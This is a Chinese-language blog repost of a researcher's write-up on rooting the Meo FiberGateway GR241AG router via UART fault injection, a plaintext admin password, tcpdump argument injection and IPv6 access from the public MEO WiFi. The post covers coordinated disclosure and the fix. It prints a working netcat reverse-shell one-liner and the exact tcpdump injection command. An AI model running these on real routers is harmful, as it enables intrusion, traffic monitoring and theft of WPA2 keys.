---
title: 拍桌子才出 root：FiberGateway GR241AG 从 UART 故障注入打到 MEO 公网 WiFi RCE
url: https://mp.weixin.qq.com/s/HS6sucDbKZm9zE_W1eaIhQ
source: Doonsec's feed
date: 2026-09-23
fetch_date: 2026-09-24T06:58:43.406899
---

# 拍桌子才出 root：FiberGateway GR241AG 从 UART 故障注入打到 MEO 公网 WiFi RCE

# 拍桌子才出 root：FiberGateway GR241AG 从 UART 故障注入打到 MEO 公网 WiFi RCE

赛博安全攻防日记

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 拍桌子才出 root：FiberGateway GR241AG 从 UART 故障注入打到 MEO 公网 WiFi RCE

2023 年，作者发现葡萄牙运营商 Meo 下发的 **FiberGateway GR241AG**，能通过默认开启、且只能打客服才能关掉的公网 Wi‑Fi「**MEO WiFi**」拿下整机 root。受影响家庭超过 **160 万**。

![FiberGateway GR241AG 路由](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84X5l6Bx0oSyeMK7ftOBNlZnXMa9ibtPkdghRMCRFoNsLd7PqoMzFkxDo4ib2TpuImaewMIvM7IQn43xL7icPBEhJgO7BYT8rOKVDo/640?wx_fmt=jpeg&from=appmsg)

![MEO WiFi 覆盖示意](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84W4QIdBjuaEtVibpdBPtrI0CbtibibUACtjENzaVkpUKAYuruYVV0elLicB7ZFFewibBJpM6AECEV4C1hQw9hNt11mKF2dYB4oTiayU8/640?wx_fmt=jpeg&from=appmsg)

## 缘起

**2020** 年作者办了 Meo 宽带。一上手 Web 面板就发现：**DNS 改不了**。本想挂树莓派跑 Pi-hole，又不想给每台设备单独改 DNS；前面再塞一台路由又要钱——于是埋下坑。

**2022** 年，不想花一百多欧从运营商买、也不想违约乱拆自家机器，就去二手市场（OLX）淘了一台 **FiberGateway GR241AG**，十欧到手。

## 找到串口

拆机后一眼看到 **UART** 和 **JTAG**。万用表摸清 UART 脚位，接上 Bus Pirate。

![UART 板端特写](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84UyicOFC2tAlCetIdyiaAKC58HqppkQm906w30uLEcKxWicbu9I6Pia0M9YeJjE0B0PuwcQCbzEyZxWJf6fygUYNSVvniamGcU7B5y0/640?wx_fmt=jpeg&from=appmsg) ![Bus Pirate 接 UART](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84VPya2RkZB5wiba4aapIuqoHQ0n96VVoHWy6SpHa3XSEoBuJ8sgJ772pibTiapxibYwDBfLHbr97qibibLtLyZQp9BFf6bRmtyv3RibQI/640?wx_fmt=jpeg&from=appmsg)

串口能通，但 **U-Boot 有密码**；启动后还要账号口令。默认 **meo/meo** 能进，拿到的却和 SSH/Telnet 一样——还是受限 shell。

## 串口 root：靠振动「故障注入」

听着像电影情节，但作者说就是这么发生的：当时旁边硬盘在做数据恢复。

HDD 震动叠加 Bus Pirate 虚接/松动，像某种 **fault injection**——启动过程里触发段错误，直接掉进 **root shell**。

接着赶紧跑 **init 脚本**，免得 watchdog 60 秒把 shell 杀掉。

有时候运气真的很重要。

![UART root shell](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84UGsFK3KoDs0324W5homBouLSkPVMvGlUx77CJL6ib40Z1dzQ1ShA8DqUXVBicMS3rNibx9ia6zm5YaO3ibOwqdcm7jQKVJicricKYY2k/640?wx_fmt=jpeg&from=appmsg)

一开始还以为是随机现象。硬盘恢复一停，shell 就再也出不来。**于是流程变成：重启路由 → 拍桌子 → 再拍，直到再次掉进 root。** 离谱。

![拍桌子梗图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84XKcyMDu8vXzzEib45vkPFibVrhDjoyd4NWWjSRqNHnfFjnfOENZjqmibyicdTSOiaFJicZS8qcahThe90uu8Rib6drUYv1jzRiagARy80/640?wx_fmt=jpeg&from=appmsg)

## 管理员受限 Shell

下一步：抽固件。路由有 USB，插 U 盘拷 **mtdblock**，再用 **binwalk** 解包。翻凭据时，在某库里发现 **admin 明文口令**——**而且不是公开默认口令**。

![库里的 admin 口令线索](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84Up8ECOQdzJUbpQbF3nVHtHaw5icmKbZpVErSYZ86ExCOqhDHmFmjT6wjkjVM31icR65LzqfDTMz2X7WH14aMrEV37787rZMn010/640?wx_fmt=jpeg&from=appmsg) ![明文 admin 口令](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84Xrzf8AgFOEPO4ZdVutfJynW0ia8OvHlqACOSgZm5dnaX9cX4vkFT2UzhTEMXYicibZPSwRHVrQKGibe16rVg0m0GMEh0T4bnfLWTs/640?wx_fmt=jpeg&from=appmsg)

用这口令能进 **admin** shell。仍受限，但能力多了不少：

* 监控流量，**含公网 MEO WiFi 流量**
* 升级固件
* **改 DNS**

![admin 受限 shell](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84VuCFYJmJ4wtGHKdtwXp5H0ztmNXZb4hwIlVYtrkVxNavqRybXMQErHtGlmR9BzSIWBeTFh4ibacrWgL6ibdY4HKQ2r8c44YbqhA/640?wx_fmt=jpeg&from=appmsg)

目标达成：不用再焊 UART 也能改 DNS。但作者还想继续打。

![还想要更多](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84W17EZice75QfUpgMhwTjwe4HgFUqoMGS1KOBxLKoBzGaShvpdj2VeiaWBwTOmR7xcfONF6BxoziamYwh2EZcn9BicB1GSWeEMTzLM/640?wx_fmt=jpeg&from=appmsg)

## 冲破受限 Shell

有了 admin 口令，就在受限 shell 里挖命令/参数注入。多数命令防得还行，唯独 **tcpdump** 存在 **参数注入**。

![tcpdump 参数](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84Vs7A8Z2dAibhdaUmcUhxwhKMjib6IgvaPicP7cT1bmDvHsfK70hEX007CMT7cRpF89y06v91aZu9pNQRPDvYGZIj6J4HZ94vTXib4/640?wx_fmt=jpeg&from=appmsg)

GTFOBins 提到：用 **-z** 可在日志轮转时执行命令。

路由有 USB，挂载路径已知——把可执行的反弹 shell 脚本放进 U 盘即可：

```
#!/bin/sh /bin/sh -c rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.79 4444 >/tmp/f
```

SSH 登入 admin 受限壳，执行：

```
/debug/tcpdump --filter="udp port 1234" --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
```

再开 **nc** 监听，往 1234/UDP 打一包，触发 **tcpdump postrotate**，拿到非受限 shell。

![tcpdump 打出非受限 shell](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84Xo8AJHK9OyfqK8HER99aeIj7xLKoicIZOHwmwiaSmDCsCPtpic6KzHWZdRuciczV4XpbeCoV3Lx34siciaMmAAicdSKGyTr6E1dmOHOU/640?wx_fmt=jpeg&from=appmsg)

## 远程代码执行

这招仍要物理插 U 盘。停测几个月后再回头看 man page：**-z** 配合 **-G** 时，postrotate 命令会把保存的文件当作输入——等于能把要执行的命令从网络侧送进去，**不再需要物理接触**。

![tcpdump postrotate 说明](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84XXP98JuhRgGFLcANAcbSibYicom1yHReslBOT8TeTktQFDWzl1JeaNYLE0hGPza5gzunxHIEq3bySTibBsSRKPgfxGcia2FG9CXNI/640?wx_fmt=jpeg&from=appmsg) ![网络侧 RCE 反弹 shell](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84VprkHDVXvPS6JTicNfaJMiblcOiaxpia9a8YVXfHHA97fyT9wxAgwIZjngbBr1uqBbricUvBb34JxgSwmZgib5x3UcdejV3omaxqU2U/640?wx_fmt=jpeg&from=appmsg)

## 默认开启的 MEO WiFi 公网

这张公网 Wi‑Fi **默认开着**，只能打客服关。全国 **160 万+** 热点，桥接进 Meo 骨干。

有了 root 后发现：多数服务绑在所有接口上；MEO WiFi 口只有 IPv6。**从 MEO WiFi 用 IPv6 访问路由 Web——居然通了。**

![经 IPv6 打开 Web](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84Vn07FWrXvzxMc3EHYn8ibia3kwhUG6N6qd5AaoE4osdE5ghth5ia3ounnRAGWNXuRPGDdCbydj6grKxHiaTFW6jzuYcl5WCwzweQU/640?wx_fmt=jpeg&from=appmsg) ![接口信息](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84XjiaHcV6wBNm21L7KFn6jDF3fvJ64ibibEs60nDNRdHVQ2UssfJudrORicAvRwMFkXGp3RUdsQSmPwaYlRR1KjjFDMuRBN5fSKCXo/640?wx_fmt=jpeg&from=appmsg) ![IPv6 地址](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84WZOaneAjgxKCvNsZoKpoqJWFfrnET20EQ21WzPXIyGviczJTcc1Hbt6bAqcr1klNdLn344tibic0b7AFic17g9PVTDyiaY89G8R2yU/640?wx_fmt=jpeg&from=appmsg)

## 经 MEO WiFi 公网打 RCE

麻烦在于 **IPv6 每次重启都变**。Wireshark 抓联机流量也摸不准，爆破又不现实。

IPv6 有 **Neighbor Discovery Protocol（NDP）**，靠 **ICMPv6** 干类似 IPv4 ARP 的活。往组播地址打 ICMPv6，就能摸到网内节点的路由信息。

![NDP 示意](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84XUCNmE7YgicwrOAjKI0gr6ufAkRZFVkkH6iaAjs4GibAlrbRhX3sYC1XW6NhMyOapqS05k6pb6UqgCgVribwBNFsts2tNbuHzDKDo/640?wx_fmt=jpeg&from=appmsg)

MEO WiFi 口开了 NDP。往 **ff02::2**（All-Routers）发 ICMPv6，就能发现该接口 IPv6。

![ICMPv6 发现](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84UyKNJZ8Fgk9ZJiafYBqvkznyAZ550Oc9BF13bF9WrxCShTETH9HnwibUuCkFJA3slx0FRFHLUXBZmES6WuFEojqDxM1rVeicrfkM/640?wx_fmt=jpeg&from=appmsg)

完整链路：

1. 连上 **MEO WiFi**，对 **ff02::2** 发 ICMPv6，拿到 IPv6
2. 用 **admin** 经 SSH/Telnet 连该 IPv6
3. 本机 IPv6 上开 **nc** 监听
4. 打 **tcpdump** 参数注入，拿 **反向 shell**

![IPv6 全链路反弹](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84V2BelVaWljlsIyP1aGibKhp44qOU08SS4BwQUQA4P1aKzrSUPv8qibcQY3aP9E9bFCoD3eAntzV3LOwiahAMyNYfGEXic66TmbcVI/640?wx_fmt=jpeg&from=appmsg)

作者还写了两份 Python：一份跑完整利用链，一份直接 dump 私网 Wi‑Fi 的 **WPA2** 密钥。

## 影响面

站在任一 **160 万+** 热点的信号范围内，攻击者可以：

* DNS 劫持
* 抽通话记录
* 监控流量
* 抽 WPA2 密钥
* 摸内网设备
* DoS

![影响面梗图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84UickEYb3wjrpSEtS6WQ5YgTkV9kj9MoF7adWVibLhboB3ib15yhPe9zwgl1iaTLibBKaww4hc2Nxfvia8DaMAfUXZlPSOsGVVZ57Yib4/640?wx_fmt=jpeg&from=appmsg)

## 披露

作者报给葡萄牙国家网络安全中心（CNCS），对方转 Meo CERT。**一周后，经 MEO WiFi 口的 RCE 路径就被掐断。**

其余问题随后几个月陆续修；admin 口令也换了，作者没法再复测。

没拿赏金，至少获准发这篇 writeup。

## 时间线

![披露时间线](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84XqrAylmDqcNqstNFRiauhGJwLbnSO5JQJ1nsEJxg2HonoxomecWvnvuL00rOPVr5XrR5BCHoSDKoaOf5uicA2CTic93CibAjkAjSU/640?wx_fmt=jpeg&from=appmsg)

## 顺手挖到的

不在主链上、但也值得记一笔：

* **nslookup**

  输出重定向导致的 **任意写**

![nslookup 任意写](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84WQe0ib5wT9RuwfjBvibPv4q1vJkLAuWCjNYNp9lGjaCp8aE0iad77w6CaHuE7d9NGsoypaZz1dkgVRM90mLYyzQsOpnpj9PGQ7f4/640?wx_fmt=jpeg&from=appmsg)

* **wget**

  上的 **缓冲区溢出**

![wget 溢出](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84WN1qPNX4c6FekjkR7veQS8j54jvFCcQRthEMQUibJ44BeRjALAfxwhg1Aap6z28u1CoNnFEknxFuddDZfKggdZGY7T0qt06Mjk/640?wx_fmt=jpeg&from=appmsg)

## RootedPT 2025

作者在 RootedCON PT 2025 讲了这套研究——台上很嗨，台下也好评。

![RootedCON PT 演讲](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JdicK53hX84U3Oibl38eKwXZNn83rLXFfRsetDNDkia66LdRJOVQiaHnU4Uv5OzyC5fhP6I4YTrBiax7fDOzbEia0LyCqlAD3IQgsLfvTEudA9ZAQ/640?wx_fmt=jpeg&from=appmsg)

作者：João Domingos / r0ny

---

免责声明：

本人所有文章均为技术分享，均用于防御为目的的记录，请勿用于其他用途，否则后果自负。

更多 IoT / 车联网 / 机器人 / AI 安全资料在星球里，扫码进「车联网攻防日记」。

![知识星球二维码](https://mmbiz.qpic.cn/mmbiz_jpg/JdicK53hX84W0QgPSibeeCWvbzLsQliaHDk1icdZEGryyv8vXQWz6Nuj6d4TQaoicZicWyEgxk9rMWWtngLl1ibpCuKa8VZYZIzT5SYOE418ITG6Vo/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpi...